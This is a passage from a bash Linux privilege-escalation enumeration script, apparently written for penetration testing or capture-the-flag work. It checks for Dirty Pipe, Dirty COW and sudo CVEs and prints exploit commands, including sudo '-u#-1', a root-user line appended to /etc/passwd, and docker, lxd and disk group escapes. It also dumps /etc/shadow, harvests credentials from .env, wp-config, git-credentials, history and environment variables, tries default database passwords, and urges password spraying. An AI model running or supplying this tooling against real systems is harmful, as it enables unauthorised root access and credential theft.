        echo -e "  ${LMAGENTA}Exploit: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit${NC}"
    else
        echo -e "${GREEN}Not vulnerable (patched)${NC}"
    fi
else
    echo -e "${GREEN}Not vulnerable${NC}"
fi

# Dirty COW
echo -e "\n${YELLOW}[+] ${NC}Dirty COW (CVE-2016-5195):"
if (( ${ver1:-0} < 4 )) || (( ${ver1:-0} == 4 && ${ver2:-0} < 9 )); then
    echo -e "\033[1;31;103m POSSIBLY VULNERABLE — Kernel $ver1.$ver2.$ver3 \033[0m"
    echo -e "  ${LMAGENTA}Exploit: gcc -pthread dirty.c -o dirty -lcrypt${NC}"
    echo -e "  ${LMAGENTA}https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs${NC}"
else
    echo -e "${GREEN}Not vulnerable${NC}"
fi

# Baron Samedit
echo -e "\n${YELLOW}[+] ${NC}Baron Samedit (CVE-2021-3156):"
sudo_version=$(sudo -V 2>/dev/null | head -1 | cut -d " " -f3)
if [ ! -z "$sudo_version" ]; then
    echo -e "  sudo version: ${CYAN}$sudo_version${NC}"
    # Non-interactive test — check version range instead of running sudoedit
    sudo_major=$(echo "$sudo_version" | cut -d. -f1)
    sudo_minor=$(echo "$sudo_version" | cut -d. -f2)
    sudo_patch=$(echo "$sudo_version" | cut -d. -f3 | sed 's/p.*//')
    vulnerable=0
    # Vulnerable: 1.8.2 through 1.8.31p2, and 1.9.0 through 1.9.5p1
    if [ "$sudo_major" = "1" ] && [ "$sudo_minor" = "8" ]; then
        if [ "${sudo_patch:-0}" -ge 2 ] && [ "${sudo_patch:-0}" -le 31 ]; then
            vulnerable=1
        fi
    elif [ "$sudo_major" = "1" ] && [ "$sudo_minor" = "9" ]; then
        if [ "${sudo_patch:-0}" -le 5 ]; then
            vulnerable=1
        fi
    fi
    if [ $vulnerable -eq 1 ]; then
        echo -e "\033[1;31;103m LIKELY VULNERABLE — sudo $sudo_version in affected range \033[0m"
        echo -e "  ${LMAGENTA}Exploit: https://github.com/blasty/CVE-2021-3156${NC}"
        echo -e "  ${LMAGENTA}Test: sudoedit -s '\\' \$(python3 -c \"print('A'*100)\") — segfault = vuln${NC}"
    else
        echo -e "${GREEN}Not vulnerable (sudo $sudo_version outside affected range)${NC}"
    fi

    # Additional sudo CVEs
    if [ "$sudo_major" = "1" ] && [ "$sudo_minor" = "8" ] && [ "${sudo_patch:-0}" -lt 26 ]; then
        echo -e "\033[1;31;103m CVE-2019-18634 (pwfeedback buffer overflow) \033[0m"
        echo -e "  ${LMAGENTA}https://github.com/saleemrashid/sudo-cve-2019-18634${NC}"
    fi
    if [ "$sudo_major" = "1" ] && [ "$sudo_minor" = "8" ] && [ "${sudo_patch:-0}" -lt 28 ]; then
        echo -e "\033[1;31;103m Sudo < 1.8.28 — User ID bypass \033[0m"
        echo -e "  ${LMAGENTA}sudo -u#-1 /bin/bash${NC}"
    fi
else
    echo -e "${GREEN}sudo not found${NC}"
fi

# Compilers
echo -e "\n${YELLOW}[+] ${NC}Compilers available:"
for compiler in gcc cc g++ python python3 perl ruby make; do
    path=$(which $compiler 2>/dev/null)
    [ -n "$path" ] && echo -e "  $compiler: $path"
done

# ============================================================================
# USER/GROUP INFORMATION
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║             USER/GROUP INFORMATION                        ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Users with login shells:"
grep -E "(/bin/bash|/bin/sh|/bin/zsh)" /etc/passwd 2>/dev/null | cut -d: -f1,7 | while read user; do
    echo -e "  ${CYAN}$user${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}Super user accounts (uid 0):"
awk -F: '$3 == 0 {print $1}' /etc/passwd 2>/dev/null | while read su; do echo -e "  ${LRED}$su${NC}"; done

echo -e "\n${YELLOW}[+] ${NC}Privileged group members:"
for group in sudo wheel admin docker lxd shadow disk adm; do
    members=$(grep "^$group:" /etc/group 2>/dev/null | cut -d: -f4)
    [ ! -z "$members" ] && echo -e "  ${LRED}$group: $members${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}/etc/passwd permissions:"
ls -lah /etc/passwd 2>/dev/null
if [ -w /etc/passwd ]; then
    echo -e "\033[1;31;103m /etc/passwd is WRITABLE! \033[0m"
    echo -e "  ${LMAGENTA}openssl passwd -1 -salt hacker password123${NC}"
    echo -e "  ${LMAGENTA}echo 'hacker:\$1\$hacker\$TdQy4...:0:0:root:/root:/bin/bash' >> /etc/passwd${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}/etc/shadow permissions:"
ls -lah /etc/shadow 2>/dev/null
if [ -r /etc/shadow ]; then
    echo -e "\033[1;31;103m /etc/shadow is READABLE! \033[0m"
    head -5 /etc/shadow 2>/dev/null
fi

hashesinpasswd=$(grep -v '^[^:]*:[x*]' /etc/passwd 2>/dev/null | grep -v '^#')
if [ "$hashesinpasswd" ]; then
    echo -e "\n\033[1;31;103m Password hashes in /etc/passwd! \033[0m"
    echo -e "${CYAN}$hashesinpasswd${NC}"
fi

# ============================================================================
# SUDO CHECK WITH EXPLOIT COMMANDS
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║          SUDO PRIVILEGES (with exploit commands)          ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

check_sudo_exploits() {
    local sudo_output="$1"
    if [ -z "$sudo_output" ]; then return; fi

    echo -e "${RED}$sudo_output${NC}"
    echo ""

    # Extract binary paths and check for exploits
    local bins=$(echo "$sudo_output" | grep -E '^\s+\(' | awk '{print $NF}' | xargs -n 1 basename 2>/dev/null | sort -u)
    local found=0
    for bin in $bins; do
        local result=$(get_exploit "$bin" sudo 2>/dev/null)
        if [ $? -eq 0 ] && [ -n "$result" ]; then
            echo -e "\033[1;31;103m EXPLOITABLE: $bin \033[0m"
            get_exploit "$bin" sudo
            echo ""
            found=1
        fi
    done
    [ $found -eq 0 ] && echo -e "${GREEN}  No known exploitable sudo binaries found${NC}"
}

echo -e "\n${YELLOW}[+] ${NC}Passwordless sudo check:"
sudo_nopass=$(sudo -n -l 2>/dev/null)
if [ "$sudo_nopass" ]; then
    check_sudo_exploits "$sudo_nopass"
else
    echo -e "${GREEN}  Not available without password${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Sudo with provided password:"
if [ -n "$PASSWORD" ]; then
    sudo_withpass=$(echo "$PASSWORD" | sudo -S -l -k 2>/dev/null)
    if [ "$sudo_withpass" ]; then
        echo -e "\033[1;31;103m sudo -l SUCCEEDED with password! \033[0m"
        check_sudo_exploits "$sudo_withpass"
    else
        echo -e "${GREEN}  Failed with provided password${NC}"
    fi
else
    echo -e "${YELLOW}  Skipped — no password provided (-p)${NC}"
fi

# ============================================================================
# SUID/SGID WITH EXPLOIT COMMANDS
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║       SUID/SGID FILES (with exploit commands)             ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}SUID binaries:"
suid_files=$(find / -perm -u=s -type f 2>/dev/null)
exploitable_suid=0
if [ ! -z "$suid_files" ]; then
    while IFS= read -r file; do
        bin=$(basename "$file")
        result=$(get_exploit "$bin" suid 2>/dev/null)
        if [ $? -eq 0 ] && [ -n "$result" ]; then
            echo -e "\033[1;31;103m EXPLOITABLE: $file \033[0m"
            get_exploit "$bin" suid
            echo ""
            exploitable_suid=1
        fi
    done <<< "$suid_files"

    if [ $exploitable_suid -eq 0 ]; then
        echo -e "${GREEN}  No exploitable SUID binaries found${NC}"
    fi

    # List all SUID for reference
    echo -e "\n${YELLOW}[+] ${NC}All SUID files:"
    echo "$suid_files" | while read f; do echo -e "  $f"; done
fi

echo -e "\n${YELLOW}[+] ${NC}SGID files:"
find / -perm -g=s -type f 2>/dev/null | while read f; do echo -e "  $f"; done

echo -e "\n${YELLOW}[+] ${NC}World-writable SUID (CRITICAL):"
wwsuid=$(find / -perm -4002 -type f 2>/dev/null)
if [ "$wwsuid" ]; then
    echo -e "\033[1;31;103m World-writable SUID files! \033[0m"
    echo -e "${LRED}$wwsuid${NC}"
else
    echo -e "${GREEN}  None${NC}"
fi

# ============================================================================
# CAPABILITIES WITH EXPLOIT COMMANDS
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║        CAPABILITIES (with exploit commands)               ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Files with capabilities:"
cap_result=$(/usr/sbin/getcap -r / 2>/dev/null)
if [ ! -z "$cap_result" ]; then
    echo "$cap_result" | while IFS= read -r line; do
        file=$(echo "$line" | awk '{print $1}')
        caps=$(echo "$line" | awk '{$1=""; print $0}')
        bin=$(basename "$file")
        echo -e "  ${CYAN}$line${NC}"

        # Check for ep (effective+permitted) — most exploitable
        if echo "$caps" | grep -qE "ep$|=ep"; then
            result=$(get_exploit "$bin" cap 2>/dev/null)
            if [ $? -eq 0 ] && [ -n "$result" ]; then
                echo -e "  \033[1;31;103m EXPLOITABLE \033[0m"
                get_exploit "$bin" cap
            fi
        fi
    done
else
    echo -e "${GREEN}  No capabilities found${NC}"
fi

# ============================================================================
# ENVIRONMENT
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║             ENVIRONMENTAL INFORMATION                     ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Sensitive environment variables:"
(env 2>/dev/null || set 2>/dev/null) | grep -iE "pass|pwd|key|secret|token|api" | grep -v "_=/" | while read line; do
    echo -e "  ${LRED}$line${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}PATH writable directories:"
writable_path=0
for dir in $(echo $PATH | tr ":" " "); do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        echo -e "  \033[1;31;103m WRITABLE: $dir — PATH hijacking possible! \033[0m"
        writable_path=1
    fi
done
[ $writable_path -eq 0 ] && echo -e "${GREEN}  No writable PATH dirs${NC}"

echo -e "\n${YELLOW}[+] ${NC}Home directory permissions:"
ls -lah /home 2>/dev/null

if [ -r /root ]; then
    echo -e "\n\033[1;31;103m /root is READABLE! \033[0m"
    ls -lah /root 2>/dev/null
fi

# ============================================================================
# CRON & SCHEDULED TASKS
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║           CRON & SCHEDULED TASKS                          ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}System crontab:"
cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$"

echo -e "\n${YELLOW}[+] ${NC}Cron directories:"
ls -lah /etc/cron* 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Writable cron files/dirs:"
ww_cron=$(find /etc/cron* -writable 2>/dev/null)
if [ "$ww_cron" ]; then
    echo -e "\033[1;31;103m Writable cron entries! \033[0m"
    echo -e "${LRED}$ww_cron${NC}"
else
    echo -e "${GREEN}  None${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Writable scripts referenced in cron:"
grep -hEv '^#|^$|^[A-Z]' /etc/crontab /etc/cron.d/* 2>/dev/null | awk '{for(i=6;i<=NF;i++) print $i}' | grep -oE '/[^ ;|&>]+' | sort -u | while read script; do
    if [ -w "$script" ] 2>/dev/null; then
        echo -e "  \033[1;31;103m WRITABLE: $script \033[0m"
    fi
done

echo -e "\n${YELLOW}[+] ${NC}Systemd timers:"
systemctl list-timers --all --no-pager 2>/dev/null | head -15

echo -e "\n${YELLOW}[+] ${NC}Writable systemd service files:"
ww_svc=$(find /etc/systemd/system /lib/systemd/system -writable -type f 2>/dev/null)
if [ "$ww_svc" ]; then
    echo -e "\033[1;31;103m Writable service files! \033[0m"
    echo -e "${LRED}$ww_svc${NC}"
else
    echo -e "${GREEN}  None${NC}"
fi

# ============================================================================
# SERVICES & PROCESSES
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║             SERVICES & PROCESSES                          ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Processes running as root:"
ps aux 2>/dev/null | grep "^root" | grep -vE "\[.*\]" | head -20

echo -e "\n${YELLOW}[+] ${NC}Init.d files NOT owned by root:"
initd=$(find /etc/init.d/ \! -uid 0 -type f 2>/dev/null)
if [ "$initd" ]; then
    echo -e "\033[1;31;103m Init.d files NOT owned by root! \033[0m"
    echo -e "${LRED}$initd${NC}"
fi

# ============================================================================
# NETWORK
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║               NETWORK INFORMATION                         ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Interfaces:"
ip a 2>/dev/null | grep -E "^[0-9]|inet " || ifconfig 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Listening services:"
(ss -tunlp 2>/dev/null || netstat -tunlp 2>/dev/null) | head -25

echo -e "\n${YELLOW}[+] ${NC}Routing:"
ip route 2>/dev/null || route -n 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}ARP:"
cat /proc/net/arp 2>/dev/null

# ============================================================================
# SSH KEYS & CONFIG
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║             SSH KEYS & CONFIGURATION                      ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}SSH private keys:"
for keytype in id_rsa id_ecdsa id_ed25519 id_dsa; do
    keys=$(find / -name "$keytype" -type f 2>/dev/null | head -10)
    if [ "$keys" ]; then
        for key in $keys; do
            if [ -r "$key" ]; then
                echo -e "  \033[1;31;103m READABLE: $key \033[0m"
            else
                echo -e "  ${CYAN}$key (not readable)${NC}"
            fi
        done
    fi
done

echo -e "\n${YELLOW}[+] ${NC}Writable authorized_keys:"
auth_writable=$(find / -name authorized_keys -writable 2>/dev/null | head -5)
if [ "$auth_writable" ]; then
    echo -e "\033[1;31;103m Writable authorized_keys! \033[0m"
    echo -e "${LRED}$auth_writable${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}SSH root login:"
sshrootlogin=$(grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#")
[ "$sshrootlogin" ] && echo -e "  $sshrootlogin"

# ============================================================================
# INTERESTING FILES
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║             INTERESTING FILES                             ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Hidden files in /home:"
find /home -name ".*" -type f 2>/dev/null | grep -v ".bash" | head -20 | while read f; do
    echo -e "  ${CYAN}$f${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}Backup files (.bak, .old, .backup):"
find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.orig" -o -name "*.save" \) 2>/dev/null | grep -v "/usr/" | head -15 | while read f; do
    echo -e "  $f"
done

echo -e "\n${YELLOW}[+] ${NC}Recently modified files (last 10 min):"
find / \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o -type f -mmin -10 -print 2>/dev/null | head -15

echo -e "\n${YELLOW}[+] ${NC}SUID/SGID in /opt:"
opt_suid=$(find /opt \( -perm -u=s -o -perm -g=s \) -type f 2>/dev/null)
if [ "$opt_suid" ]; then
    echo -e "\033[1;31;103m SUID/SGID in /opt! \033[0m"
    echo -e "${LRED}$opt_suid${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Useful transfer tools:"
for tool in wget curl nc ncat socat python3 perl ruby php; do
    p=$(which $tool 2>/dev/null)
    [ -n "$p" ] && echo -e "  $tool: $p"
done

# ============================================================================
# PASSWORD HUNTING
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║               PASSWORD HUNTING                            ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Bash history (interesting commands):"
find /home /root -name ".bash_history" -readable 2>/dev/null | while read hist; do
    interesting=$(grep -iE "pass|ssh|mysql|su |sudo|token|secret|curl.*-u|wget.*@|scp|ftp" "$hist" 2>/dev/null | tail -5)
    if [ -n "$interesting" ]; then
        echo -e "  ${LRED}$hist:${NC}"
        echo "$interesting" | while read line; do echo -e "    ${CYAN}$line${NC}"; done
    fi
done

echo -e "\n${YELLOW}[+] ${NC}WordPress configs:"
wp_configs=$(find / -name "wp-config.php" -readable 2>/dev/null | head -5)
if [ "$wp_configs" ]; then
    echo -e "\033[1;31;103m wp-config.php found! \033[0m"
    for f in $wp_configs; do
        echo -e "  ${LRED}$f${NC}"
        grep -E "DB_USER|DB_PASSWORD" "$f" 2>/dev/null | while read line; do
            echo -e "    ${CYAN}$line${NC}"
        done
    done
fi

echo -e "\n${YELLOW}[+] ${NC}htpasswd files:"
htpw=$(find / -name .htpasswd -readable 2>/dev/null)
if [ "$htpw" ]; then
    echo -e "\033[1;31;103m .htpasswd found! \033[0m"
    for f in $htpw; do
        echo -e "  ${LRED}$f${NC}"
        cat "$f" 2>/dev/null | while read line; do echo -e "    ${CYAN}$line${NC}"; done
    done
fi

echo -e "\n${YELLOW}[+] ${NC}Git credentials:"
gitcreds=$(find / -name ".git-credentials" -readable 2>/dev/null)
if [ "$gitcreds" ]; then
    echo -e "\033[1;31;103m .git-credentials found! \033[0m"
    for f in $gitcreds; do
        echo -e "  ${LRED}$f${NC}"
        cat "$f" 2>/dev/null | while read line; do echo -e "    ${CYAN}$line${NC}"; done
    done
fi

echo -e "\n${YELLOW}[+] ${NC}.env files:"
env_files=$(find / -name ".env" -readable -not -path "*/node_modules/*" 2>/dev/null | head -10)
if [ "$env_files" ]; then
    echo -e "\033[1;31;103m .env files found! \033[0m"
    for f in $env_files; do
        echo -e "  ${LRED}$f${NC}"
        grep -iE "pass|secret|key|token" "$f" 2>/dev/null | head -5 | while read line; do
            echo -e "    ${CYAN}$line${NC}"
        done
    done
fi

echo -e "\n${YELLOW}[+] ${NC}SNMP config:"
if [ -r /etc/snmp/snmpd.conf ]; then
    snmp=$(grep -iE "community|pass|auth|priv" /etc/snmp/snmpd.conf 2>/dev/null | grep -v "^#")
    if [ -n "$snmp" ]; then
        echo -e "\033[1;31;103m SNMP credentials! \033[0m"
        echo -e "${CYAN}$snmp${NC}"
    fi
fi

echo -e "\n${YELLOW}[+] ${NC}Database configs in PHP:"
find /var/www /opt -name "*.php" -type f 2>/dev/null -exec grep -l "mysql_connect\|mysqli\|PDO\|pg_connect" {} \; | head -5 | while read php; do
    echo -e "  ${CYAN}$php${NC}"
    grep -i "password\|user" "$php" 2>/dev/null | grep -v "//" | head -3 | while read line; do
        echo -e "    ${LRED}$line${NC}"
    done
done

echo -e "\n${YELLOW}[+] ${NC}Private SSH keys in content:"
grep -rl "PRIVATE KEY-----" /home /root /opt /tmp /var 2>/dev/null | head -5 | while read f; do
    echo -e "  ${LRED}$f${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}Files with 'password' in name:"
find / -iname "*password*" -type f 2>/dev/null | grep -v "/usr/share\|/usr/lib\|/proc\|/sys" | head -10 | while read f; do
    echo -e "  $f"
done

# ============================================================================
# DATABASE
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║               DATABASE ENUMERATION                        ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

if which mysql >/dev/null 2>&1; then
    echo -e "\n${YELLOW}[+] ${NC}MySQL:"
    mysql --version 2>/dev/null
    if mysqladmin -uroot version 2>/dev/null >/dev/null; then
        echo -e "\033[1;31;103m MySQL root has NO PASSWORD! \033[0m"
    elif mysqladmin -uroot -proot version 2>/dev/null >/dev/null; then
        echo -e "\033[1;31;103m MySQL root password is 'root'! \033[0m"
    fi
fi

if which psql >/dev/null 2>&1; then
    echo -e "\n${YELLOW}[+] ${NC}PostgreSQL:"
    psql -V 2>/dev/null
    if psql -U postgres -w -c 'SELECT 1' template1 2>/dev/null >/dev/null; then
        echo -e "\033[1;31;103m PostgreSQL 'postgres' has NO PASSWORD! \033[0m"
    fi
fi

# ============================================================================
# DOCKER & CONTAINERS & GROUP PRIVESC
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║        CONTAINERS & GROUP PRIVILEGE ESCALATION            ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

current_groups=$(id)

echo -e "\n${YELLOW}[+] ${NC}Container detection:"
if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
    echo -e "\033[1;31;103m Inside Docker container! \033[0m"
elif grep -qa "container=lxc" /proc/1/environ 2>/dev/null; then
    echo -e "\033[1;31;103m Inside LXC container! \033[0m"
elif [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo -e "\033[1;31;103m Inside Kubernetes Pod! \033[0m"
    if [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        echo -e "  ${LMAGENTA}Token READABLE — try kubectl with token${NC}"
    fi
else
    echo -e "${GREEN}  Not in a container${NC}"
fi

# Docker group
if echo "$current_groups" | grep -q docker; then
    echo -e "\n\033[1;31;103m USER IS IN DOCKER GROUP! \033[0m"
    echo -e "  ${LMAGENTA}docker run -v /:/mnt --rm -it alpine chroot /mnt sh${NC}"
    docker image ls 2>/dev/null | head -5
fi

# LXD group
if echo "$current_groups" | grep -qE "lxd|lxc"; then
    echo -e "\n\033[1;31;103m USER IS IN LXD/LXC GROUP! \033[0m"
    echo -e "  ${LMAGENTA}lxc init IMAGE privesc -c security.privileged=true${NC}"
    echo -e "  ${LMAGENTA}lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true${NC}"
    echo -e "  ${LMAGENTA}lxc start privesc && lxc exec privesc /bin/bash${NC}"
fi

# Disk group
if echo "$current_groups" | grep -q disk; then
    echo -e "\n\033[1;31;103m USER IS IN DISK GROUP! \033[0m"
    echo -e "  ${LMAGENTA}debugfs /dev/sda1  →  cat /etc/shadow${NC}"
    echo -e "  ${LMAGENTA}strings /dev/sda1 | grep -i password${NC}"
fi

# Adm group
if echo "$current_groups" | grep -q adm; then
    echo -e "\n\033[1;31;103m USER IS IN ADM GROUP — can read logs! \033[0m"
    echo -e "  ${LMAGENTA}grep -ri 'password\\|passwd' /var/log/ 2>/dev/null | head -10${NC}"
fi

# ============================================================================
# NFS & MOUNTS
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║               NFS & SYSTEM CONFIG                         ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}NFS exports:"
if [ -r /etc/exports ]; then
    cat /etc/exports 2>/dev/null | grep -v "^#" | while read line; do
        if echo "$line" | grep -q "no_root_squash"; then
            echo -e "  \033[1;31;103m $line — no_root_squash! \033[0m"
        else
            [ -n "$line" ] && echo -e "  $line"
        fi
    done
fi

echo -e "\n${YELLOW}[+] ${NC}Credentials in fstab:"
fstab_creds=$(grep -iE "username|password|cred" /etc/fstab 2>/dev/null)
if [ "$fstab_creds" ]; then
    echo -e "\033[1;31;103m Credentials in /etc/fstab! \033[0m"
    echo -e "${CYAN}$fstab_creds${NC}"
fi

# ============================================================================
# WRITABLE LOCATIONS
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║             WRITABLE LOCATIONS                            ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Writable files in /etc (first 15):"
find /etc -writable -type f 2>/dev/null | head -15 | while read f; do
    echo -e "  ${RED}$f${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}World-writable directories (non-standard):"
find / \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /tmp -o -path /var/tmp \) -prune -o -type d -perm -o+w -print 2>/dev/null | head -15 | while read dir; do
    echo -e "  ${RED}$dir${NC}"
done

# ============================================================================
# USERNAME HUNT
# ============================================================================
if [ -n "$USERNAME" ]; then
    echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${LBLUE}║          USERNAME HUNT: $USERNAME$(printf '%*s' $((35 - ${#USERNAME})) '')║${NC}"
    echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

    echo -e "\n${YELLOW}[+] ${NC}Files with '${USERNAME}' in filename:"
    find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -iname "*${USERNAME}*" -print 2>/dev/null | head -20 | while read f; do
        echo -e "  ${LRED}$f${NC}"
    done

    echo -e "\n${YELLOW}[+] ${NC}Files containing '${USERNAME}': ${CYAN}(may take time)${NC}"
    grep -rIl --exclude-dir={proc,sys,dev} "$USERNAME" /home /opt /etc /var /tmp /root 2>/dev/null | head -20 | while read f; do
        echo -e "  ${LRED}$f${NC}"
        grep -n "$USERNAME" "$f" 2>/dev/null | head -3 | while read match; do
            echo -e "    ${CYAN}$match${NC}"
        done
    done
fi

# ============================================================================
# FINAL SUMMARY
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║               ENUMERATION COMPLETE 🦍                     ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${LMAGENTA}[!] REMINDERS:${NC}"
echo -e "${LMAGENTA}  • Check all SUID/sudo exploits above — copy-paste ready${NC}"
echo -e "${LMAGENTA}  • Try: sudo -l (with any found passwords)${NC}"
echo -e "${LMAGENTA}  • Check kernel version against exploit-db${NC}"
echo -e "${LMAGENTA}  • Suspicious dir? grep -RniE 'pass|password|secret|token|key' /path${NC}"

if [ -z "$PASSWORD" ]; then
    echo -e "\n\033[1;31;103m Run with -p PASSWORD if you found credentials! \033[0m"
fi
if [ -n "$PASSWORD" ]; then
    echo -e "\n\033[1;31;103m PASSWORD SPRAY: try this password against ALL users! \033[0m"
    echo -e "  ${LMAGENTA}su - <user>  # try each user with login shell${NC}"
fi

echo -e "\n${YELLOW}Completed at:${NC} $(date)"
